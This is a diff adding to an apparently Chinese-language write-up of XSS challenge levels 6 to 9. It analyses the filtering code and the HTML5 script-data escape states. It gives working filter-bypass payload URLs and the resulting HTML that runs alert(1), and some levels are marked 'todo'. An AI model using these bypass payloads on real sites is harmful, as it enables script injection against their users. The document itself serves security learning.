@@ -306,3 +306,172 @@ Give me xss bypass 6~【任意浏览器弹1就算通过】
 </body>
 </html>
 ```
+
+```js
+Tjs_Get:function(parmtname){
+	var sl = location.href.indexOf('&');
+	var hl = location.href.indexOf('#');
+	var str = '';
+	if ((sl < 0 || sl > hl) && hl > 0) str = location.hash.substr(1);
+	else str = location.search.substr(1);
+			
+	str=str.replace(/%/g,"");//%被过滤
+	var SERVER_TEMP			= $.Tjs_HtmlEncode(str.replace(/.*\?/,"")); //?被过滤,但因为.的存在,因此只会匹配换行符之前的东西,而之后的字符会被忽略,但是由于%被过滤,无法使用%0a进行换行
+	var PAGE_PARMT_ARRAY	= SERVER_TEMP.split("&amp;");
+	if(PAGE_PARMT_ARRAY.length==0) return "";
+	var value="";
+	for(var i=0;i<PAGE_PARMT_ARRAY.length;i++){
+		if(PAGE_PARMT_ARRAY[i]=="") continue;
+		var GETname = PAGE_PARMT_ARRAY[i].substr(0,PAGE_PARMT_ARRAY[i].indexOf("="));
+		if(GETname == parmtname){
+			value = PAGE_PARMT_ARRAY[i].substr((PAGE_PARMT_ARRAY[i].indexOf("=")+1),PAGE_PARMT_ARRAY[i].length);
+			return value;
+			break;
+		}
+	}
+	return "";
+}
+```
+
+>todo
+
+
+
+
+# xsstest7
+
+```html
+<script>
+var px='';
+</script>
+give me xss by pass~7
+<div style="display:none"></div>
+<!--px-->
+<script>
+'px'
+</script>
+```
+
+fuzz得知`'`被过滤,但`\`没有被过滤
+
+[https://www.w3.org/TR/2010/WD-html5-20100624/tokenization.html#script-data-escaped-dash-dash-state](https://www.w3.org/TR/2010/WD-html5-20100624/tokenization.html#script-data-escaped-dash-dash-state)
+
+脚本数据共有三种状态
+
+1. 脚本数据转义状态
+2. 脚本数据转义破折号状态
+3. 脚本数据双转义状态
+
+```html
+<script>
+    <!--
+        alert(1)
+        -->
+</script>
+```
+
+![](https://img.mi3aka.eu.org/2022/09/52adf72baff04ad69d9b597bb61a6a38.png)
+
+```html
+<script>
+    <!--<script \></script>
+
+alert(1)</script>
+```
+
+![](https://img.mi3aka.eu.org/2022/09/fcb2c56880f29ef1aaa8d6098230ddac.png)
+
+>利用脚本数据转义破折号状态进行逃逸
+
+```html
+<script>
+var px='\<!--\<script \>';
+</script>
+give me xss by pass~7
+<div style="display:none">&lt;!--&lt;script &gt;</div>
+<!--px-->
+<script>
+'px'
+</script>
+```
+
+![](https://img.mi3aka.eu.org/2022/09/1a2a9a2822ad22bf06947d276878092e.png)
+
+```
+https://px1624.sinaapp.com/test/xsstest7/?px=%3C!--%3Cscript%20%3E\%27-`;%0aalert(1)%0a//
+```
+
+![](https://img.mi3aka.eu.org/2022/09/26237a547c7a88fc38050560ef83d60e.png)
+
+```html
+<html><head><script>
+var px='\<!--\<script \>\\'-`\;
+alert(1)
+\/\/';
+</script>
+give me xss by pass~7
+<div style="display:none">&lt;!--&lt;script &gt;\'-`;
+alert(1)
+//</div>
+<!--px-->
+<script>
+'px'
+</script></head><body></body></html>
+```
+
+# xsstest8
+
+```html
+<script>
+var px='';
+var px1624='';
+</script>
+give me xss by pass~8
+<div style="display:none"></div>
+<input type="hidden" value="">
+```
+
+```html
+/test/xsstest8/?px=123456789123456789
+<script>
+var px='123456789123456789';
+var px1624='123456789123456789';
+</script>
+give me xss by pass~8
+<div style="display:none">123456789</div>
+<input type="hidden" value="123456789123456789">
+```
+
+与第七题的原理类似
+
+`https://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3C/script%3E%3Cscript%20%3Ealert(1)%3C/script%3E`
+
+![](https://img.mi3aka.eu.org/2022/09/815205ff0f1e6cb407eca98de3e974d3.png)
+
+![](https://img.mi3aka.eu.org/2022/09/532b009aa32c8374d56e5f75e2ab8a62.png)
+
+```html
+<html><head><script>
+var px='\<!--\<\/script\>\<script \>alert(1)\<\/script\>';
+var px1624='\<!--\<\/script\>\<script \>alert(1)\<\/script\>';
+</script>
+give me xss by pass~8
+<div style="display:none">\&lt;!--\&lt;\/</div>
+<input type="hidden" value="<!--</script><script>alert(1)</script></head><body>"&gt;</body></html>
+```
+
+# xsstest9
+
+```html
+<script>
+var px='';
+var px1624='';
+</script>
+give me xss by pass~9
+<div style="display:none"></div>
+<div style="display:none"></div>
+<!--px-->
+<script>'px'</script>
+```
+
+>todo
